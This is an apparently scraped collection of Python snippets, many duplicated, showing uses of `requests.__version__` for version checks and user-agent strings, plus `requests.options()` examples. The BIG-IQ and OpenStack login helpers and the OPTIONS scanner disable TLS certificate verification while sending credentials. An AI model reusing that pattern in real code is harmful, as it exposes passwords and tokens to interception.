                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.firewall_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.group_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        self.policy_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.group_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def log_current_versions():
    """Show current installed versions"""
    if logger.root.isEnabledFor(logging.DEBUG):
        # MAC OS X
        if sys.platform == "darwin":
            os_version = "macOS {0}".format(platform.mac_ver()[0])
        # Windows
        elif sys.platform.startswith("win"):
            os_version = "{0} {1}".format(platform.system(), platform.release())
        # linux / other
        else:
            os_version = platform.platform()

        log.debug("OS:         {0}".format(os_version))
        log.debug("Python:     {0}".format(platform.python_version()))
        log.debug("Streamlink: {0}".format(streamlink_version))
        log.debug("Requests({0}), Socks({1}), Websocket({2})".format(
            requests.__version__, socks_version, websocket_version)) 
**************************************
def _session(retries):
    """
    Ugliness required by requests lib to set max retries.
    (We don't really care about efficiency to the point where we need to re-use the session)
    """
    # https://stackoverflow.com/questions/21371809/cleanly-setting-max-retries-on-python-requests-get-or-post-method
    session = Session()
    http_adapter = HTTPAdapter(max_retries=retries)
    https_adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', http_adapter)
    session.mount('https://', https_adapter)

    # Create a User-Agent header with package, requests and Python identifiers
    from rover import __version__
    user_agent = 'rover/%s python-requests/%s Python/%s' % \
                 (__version__, requests_version, ".".join(map(str, version_info[:3])))
    session.headers.update({'User-Agent': user_agent})

    return session 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        self.policy_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.lb_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.firewall_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.group_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        self.policy_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.group_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def check_requests_dep(module):
    """Check if an adequate requests version is available"""
    if not HAS_REQUESTS:
        module.fail_json(msg='requests is required for this module')
    else:
        required_version = '2.0.0' if PY3 else '1.0.0'
        if LooseVersion(requests.__version__) < LooseVersion(required_version):
            module.fail_json(msg="'requests' library version should be >= %s, found: %s." % (required_version, requests.__version__)) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def print_debug_info(env):
    sys.stderr.writelines([
        'HTTPie %s\n' % httpie_version,
        'HTTPie data: %s\n' % env.config.directory,
        'Requests %s\n' % requests_version,
        'Pygments %s\n' % pygments_version,
        'Python %s %s\n' % (sys.version, sys.platform)
    ]) 
**************************************
def list_dependencies_and_versions():
    return [
        ('requests', requests.__version__),
        ('setuptools', setuptools.__version__),
    ] 
**************************************
def dispatch(argv):
    registered_commands = _registered_commands()
    parser = argparse.ArgumentParser(prog="pyokta-aws")
    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s version {} ({})".format(
            pyokta_aws.__version__,
            dep_versions(),
        ),
    )
    parser.add_argument(
        "command",
        choices=registered_commands.keys(),
    )
    parser.add_argument(
        "args",
        help=argparse.SUPPRESS,
        nargs=argparse.REMAINDER,
    )

    args = parser.parse_args(argv)

    main = registered_commands[args.command].load()

    return main(args.args) 
**************************************
def _get_bigiq_session(ctx, reuse=True):
    ''' Creates a Requests Session to the BIG-IQ host configured '''
    if reuse and hasattr(ctx, 'bigiq'):
        return ctx.bigiq
    if requests.__version__ < '2.9.1':
        requests.packages.urllib3.disable_warnings()  # pylint: disable=no-member
    bigiq = requests.Session()
    bigiq.ctx = ctx
    bigiq.verify = False
    bigiq.headers.update({'Content-Type': 'application/json'})
    bigiq.timeout = CONNECT_TIMEOUT
    token_auth_body = {'username': ctx.bigiqusername,
                       'password': ctx.bigiqpassword,
                       'loginProviderName': 'local'}
    login_url = "https://%s/mgmt/shared/authn/login" % (ctx.bigiqhost)
    response = bigiq.post(login_url,
                          json=token_auth_body,
                          verify=False,
                          auth=requests.auth.HTTPBasicAuth(
                              ctx.bigiqusername, ctx.bigiqpassword))
    response_json = response.json()
    bigiq.headers.update(
        {'X-F5-Auth-Token': response_json['token']['token']})
    bigiq.base_url = 'https://%s/mgmt/cm/device/licensing/pool' % ctx.bigiqhost
    ctx.bigiq = bigiq
    return bigiq 
**************************************
def parse_args():
    '''This function parses and return arguments passed in'''

    default_timeout = 3

    parser = argparse.ArgumentParser(
        description = 'Keepalived Tracking Script for HashiCorp Vault HA.')
    parser.add_argument(
        "-d", "--debug",
        action = "store_true",
        help = "execute this script in debug mode",
        dest = "debug")
    parser.add_argument(
        "-t", "--timeout",
        help = "stop waiting for a response after a given number of seconds"
               " (default: {0})".format(default_timeout),
        dest = "timeout",
        default = default_timeout,
        type = float)
    parser.add_argument(
        "-u", "--url",
        help = "vault address",
        dest = "url")
    parser.add_argument(
        "--version", action = "version",
        version = "%(prog)s v{0}"
                  " ( https://github.com/madrisan/keepalived-vault-ha )"
                  .format(__version__))

    return parser.parse_args() 
**************************************
def check_vault(url, timeout):
    '''This function returns True if the node pointed by url (if the --url
       command option has been set) or by the environment variable VAULT_ADDR
       is active, False otherwise.'''

    vault_addr = url if url else os.getenv('VAULT_ADDR', '')
    if not vault_addr:
        log.debug('Neither --url was selected nor VAULT_ADDR is set')
        return False

    log.debug('Vault URL: %s' % vault_addr)

    api_version = 'v1'
    resource = 'sys/leader'
    leader_url = '{}/{}/{}'.format(vault_addr, api_version, resource)
    log.debug('Found Python requests version %s' % requests.__version__)
    log.debug('Querying the URL: %s' % leader_url)

    try:
        r = requests.get(leader_url, timeout=timeout)
        if r.status_code != requests.codes.ok:
            log.debug('Requests returned with status code %d' % r.status_code)
            return False

        data = r.json()
        log.debug('Vault reply: {}'.format(data))

        ha_enabled = data.get('ha_enabled', False)
        log.debug('Vault ha_enabled: %s' % ha_enabled)

        is_self = data.get('is_self', False)
        log.debug('Vault is_self: %s' % is_self)

        if ha_enabled and is_self:
            return True
    except requests.exceptions.RequestException as e:
        log.error(format(str(e)))

    return False 
**************************************
def get_shard_count(self):
        r = requests.get(BOT_ENDPOINT, headers={
            "Authorization": "Bot {}".format(self.token),
            "User-Agent": 'DiscordBot (https://github.com/Rapptz/discord.py {0}) Python/{1[0]}.{1[1]} requests/{2}'.format(
                discord.__version__, sys.version_info, requests.__version__)
        })
        
        if r.status_code == 200:
            return r.json()['shards']+1
        else:
            return None 
**************************************
def get_user_agent(self):
        """
        Returns a user agent string for use in Azure REST API requests
        :return: User agent string
        :rtype: str
        """
        user_agent = "python/{} ({}) requests/{} app/AzureMetrics".format(
            platform.python_version(),
            platform.platform(),
            requests.__version__)
        return user_agent 
**************************************
def version():
    version_py = os.path.join(os.path.dirname(__file__), "zulip", "__init__.py")
    with open(version_py) as in_handle:
        version_line = itertools.dropwhile(lambda x: not x.startswith("__version__"),
                                           in_handle).next()
    version = version_line.split('=')[-1].strip().replace('"', '')
    return version 
**************************************
def init_poolmanager(self, *args, **kwargs):
        if requests.__version__ >= '2.4.1':
            kwargs.setdefault('socket_options', [
                (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),
                (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1),
            ])
        super(TCPKeepAliveAdapter, self).init_poolmanager(*args, **kwargs) 
**************************************
def init_poolmanager(self, *args, **kwargs):
        if requests.__version__ >= '2.4.1':
            kwargs.setdefault('socket_options', [
                (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),
                (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1),
            ])
        super(TCPKeepAliveAdapter, self).init_poolmanager(*args, **kwargs) 
**************************************
def init_poolmanager(self, *args, **kwargs):
        if requests.__version__ >= '2.4.1':
            kwargs.setdefault('socket_options', [
                (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),
                (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1),
            ])
        super(TCPKeepAliveAdapter, self).init_poolmanager(*args, **kwargs) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _check_version():
    if gaecontrib is None:
        raise exc.VersionMismatchError(
            "The toolbelt requires at least Requests 2.10.0 to be "
            "installed. Version {0} was found instead.".format(
                requests.__version__
            )
        ) 
**************************************
def _magic_timeout():
    # older requests lib have a single timeout value, not tuple (2.2.1 vs 2.8.1)
    if StrictVersion(requests.__version__) >= StrictVersion('2.8.1'):
        timeout = (30, 1)
    else:
        timeout = 5
    return timeout 
**************************************
def _check_version():
    if gaecontrib is None:
        raise exc.VersionMismatchError(
            "The toolbelt requires at least Requests 2.10.0 to be "
            "installed. Version {0} was found instead.".format(
                requests.__version__
            )
        ) 
**************************************
def _check_version():
    if gaecontrib is None:
        raise exc.VersionMismatchError(
            "The toolbelt requires at least Requests 2.10.0 to be "
            "installed. Version {0} was found instead.".format(
                requests.__version__
            )
        ) 
**************************************
def _check_version():
    if gaecontrib is None:
        raise exc.VersionMismatchError(
            "The toolbelt requires at least Requests 2.10.0 to be "
            "installed. Version {0} was found instead.".format(
                requests.__version__
            )
        ) 
**************************************
def print_debug_info(env):
    env.stderr.writelines([
        'HTTPie %s\n' % httpie_version,
        'HTTPie data: %s\n' % env.config.directory,
        'Requests %s\n' % requests_version,
        'Pygments %s\n' % pygments_version,
        'Python %s %s\n' % (sys.version, sys.platform)
    ]) 
**************************************
def make_ua():
    requa = 'python-requests/' + requests.__version__
    pymua = 'pyminer/%s' % __version__
    ua = requa + ' ' + pymua
    str = {
      'User-Agent': ua,
      'X-USER-AGENT': ua
    }
    return str 
**************************************
def make_ua():
    requa = 'python-requests/' + requests.__version__
    pymua = 'pyminer/%s' % __version__
    ua = requa + ' ' + pymua
    str = {
      'User-Agent': ua,
      'X-USER-AGENT': ua
    }
    return str 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def json_response(json_):
    """Requests had json as a property until 1.0.0 and as a method afterwards"""
    return json_() if LooseVersion(requests_version) >= LooseVersion('1.0.0') else json_ 
**************************************
def _get_openstack_session(ctx, reuse=True):
    if reuse and hasattr(ctx, 'openstack'):
        return ctx.openstack
    if requests.__version__ < '2.9.1':
        requests.packages.urllib3.disable_warnings()  # pylint: disable=no-member
    openstack = requests.Session()
    openstack.ctx = ctx
    openstack.verify = False
    openstack.headers.update({'Content-Type': 'application/json'})
    openstack.timeout = CONNECT_TIMEOUT
    token_auth_body = {
        'auth': {
            'scope': {
                'project': {
                    'domain': {
                        'name': ctx.os_project_domain_name
                    },
                    'name': ctx.os_project_name
                }
            },
            'identity': {
                'methods': ['password'],
                'password': {
                    'user': {
                        'domain': {
                            'name': ctx.os_user_domain_name
                        },
                        'password': ctx.os_password,
                        'name': ctx.os_username
                    }
                }
            }
        }
    }
    response = openstack.post('%s/auth/tokens' % ctx.os_auth_url,
                              json=token_auth_body,
                              verify=False)
    response_json = response.json()
    openstack.headers.update(
        {'X-Auth-Token': response.headers['X-Subject-Token']})
    catalogitems = response_json['token']['catalog']
    for catalogitem in catalogitems:
        if catalogitem['type'] == 'network':
            for endpoint in catalogitem['endpoints']:
                if endpoint['interface'] == ctx.os_interface:
                    openstack.base_url = endpoint['url']
    ctx.openstack = openstack
    return openstack 
**************************************
def main():

  parser = OptionParser(usage="%prog [-e] [-c CONFIGFILE] [-x SECTION]  [-n] [-r MAX_RECV] [-s MAX_SEND]")
  parser.add_option("-x", "--conf-section", action="store", dest="section",help="Name of the configuration section to use for connection parameters.",default="localhost")
  parser.add_option("-c", "--config-file", action="store", dest="config_path",help="Path to configuration file.",default="/etc/syncthing/set-st-bw.conf")
  parser.add_option("-n", "--no-change", action="store_true", dest="no_change",help="Make no changes, only print the current settings.")
  parser.add_option("-e", "--restart", action="store_true", dest="restart",help="Restart Syncthing after changes have been made. For Syncthing < v0.14.19.")
  parser.add_option("-r", "--max-recv", action="store", dest="max_recv",help="Set maxRecvKbps. Not required if -n is used.")
  parser.add_option("-s", "--max-send", action="store", dest="max_send",help="Set maxSendKbps. Not required if -n is used.")
  #parser.add_option("-v", "--verbose", action="count", dest="verbose",help="Verbose output. Use more than once for more noise.")
  (options, args) = parser.parse_args()

  if not options.no_change and ( options.max_recv is None and  options.max_send is None):
    parser.error("The -s and/or -r options are required unless -n is used.")

  if not os.path.exists( options.config_path ):
    bail("Config file does not exist")
  if not os.access( options.config_path, os.R_OK):
    bail("Unable to read config file. Permissions? ")

  config = ConfigParser.RawConfigParser({'insecure':0,'username':'','password':''})
  config.read(options.config_path)

  if not config.has_section(options.section):
    bail("There is no section in the configuration named '"+options.section+"'")

  url = config.get( options.section, 'url')
  username = config.get( options.section, 'username')
  password = config.get( options.section, 'password')
  creds = (username,password)
  apikey = config.get(options.section, 'apikey')

  if config.get(options.section, 'insecure' )=='True':
    verify_cert = False
    if StrictVersion(requests.__version__) >= StrictVersion('2.4'):
      requests.packages.urllib3.disable_warnings( requests.packages.urllib3.exceptions.InsecureRequestWarning )
  else:
    verify_cert = True

  config = get_st_config( url,creds,verify_cert,apikey)

  if options.no_change:
    print( 'maxSendKbps: '+ str(config['options']['maxSendKbps']) )
    print( 'maxRecvKbps: '+ str(config['options']['maxRecvKbps']) )
  else:
    if options.max_recv is not None:
      config = set_max_recv(config,options.max_recv)
    if options.max_send is not None:
      config = set_max_send(config,options.max_send)
    put_st_config(url,creds,verify_cert,config,apikey)
    if options.restart:
      restart_st(url, creds, verify_cert, apikey) 

Python requests.options() Examples

**************************************
def getOptions(self,objRef,nodetype="attributes",editable=True):
		
		if self.srvUrl not in objRef:
			objRef = self.srvUrl + objRef
		try:self.response = requests.options(url=objRef)
		except Exception, e:raise Exception('Got an error code: ', e)  
		self.checkError()
		#if debug:pprint.pprint(self.response.json())
		childrenList       = self.response.json()['custom']['children']
		attributes = self.response.json()['custom']['attributes']
		operationsList = self.response.json()['custom']['operations']
		attributesList=[]
		for attr in attributes:
			if attr['type']['name']=="href":attributesList.append(attr)
			elif attr['readOnly']==False:attributesList.append(attr)
			if editable:attributesList.append(attr)
			
				
		operationsDict = {}
		for attr in operationsList:operationsDict[attr['operation']] = attr['href']
		if nodetype=="children":returnvalues = childrenList
		elif nodetype=="operations":returnvalues = operationsDict
		else:returnvalues = attributesList
		return returnvalues 
**************************************
def scan_options(url, timeout):
    """
    OPTIONS method scanner
    """

    try:
        r = requests.options(
                url=url,
                timeout=timeout,
                verify=False)
        print(
                "    OPTIONS" + "\t> "
                + str(r.status_code) + " ("
                + str(requests.status_codes._codes[r.status_code][0]) + ")")
        print("        " + "Methods: " + r.headers["allow"])

    except (KeyboardInterrupt, SystemExit):
        sys.exit(1)

    except Exception as err:
        pass # ignore errors 
**************************************
def __init__(self):
        # Keep track of all the original functions that will
        # get replaced during a context operation
        self.__replacements = {
            'requests.request': requests.request,
            'requests.get': requests.get,
            'requests.options': requests.options,
            'requests.head': requests.head,
            'requests.post': requests.post,
            'requests.put': requests.put,
            'requests.patch': requests.patch,
            'requests.delete': requests.delete,
            'requests.session': requests.session,
            'requests.Session': requests.Session,
            'requests.sessions.Session': requests.sessions.Session
        } 
**************************************
def __exit__(self, exc_type, exc_value, traceback):
        """Exiting the context and restore the originals"""
        logger.debug('Stopping session with id {0}'
                     .format(id(local_sessions.session)))
        requests.session = self.__replacements['requests.session']
        requests.Session = self.__replacements['requests.Session']
        requests.sessions.Session = self.__replacements[
            'requests.sessions.Session']

        requests.delete = self.__replacements['requests.delete']
        requests.patch = self.__replacements['requests.patch']
        requests.put = self.__replacements['requests.put']
        requests.post = self.__replacements['requests.post']
        requests.head = self.__replacements['requests.head']
        requests.options = self.__replacements['requests.options']
        requests.get = self.__replacements['requests.get']
        requests.request = self.__replacements['requests.request']

        # Create a new session for next time
        local_sessions.session = Session()


# the Global session data 
**************************************
def api_controller_methods(self, *args):
        '''
        Read controller methods from the API backend.
        See the comments for usage details.
        '''

        self.api_authenticate()

        command = "/".join((str(a) for a in args))

        response = requests.options(
            "{}/{}/".format(self.api_endpoint, command),
            headers={"phpipam-token": self.token},
            verify=self.api_ssl_verify,
        )

        if not response.text:
            raise APIOptionsError(response.status_code, "(empty response)")

        obj = response.json()

        if not obj["success"]:
            raise APIOptionsError(obj["code"], obj["message"])

        # Create a dict which keys a command tuple with its available methods.
        #
        # Example dict:
        # {
        #   # https://ipam.example.com/api/example/vlans
        #   ("vlans",): ["OPTIONS", "GET"],
        #   # https://ipam.example.com/api/example/vlans/{id}
        #   ("vlans", "{id}"): ["GET", "POST", "PATCH", "DELETE"],
        # }
        command_methods = {}
        for href_methods in obj["data"]["methods"]:
            href = href_methods["href"]
            command = tuple(href.strip("/").split("/"))[2:]
            methods = href_methods["methods"]
            command_methods[command] = (met["method"] for met in methods)

        return command_methods 
**************************************
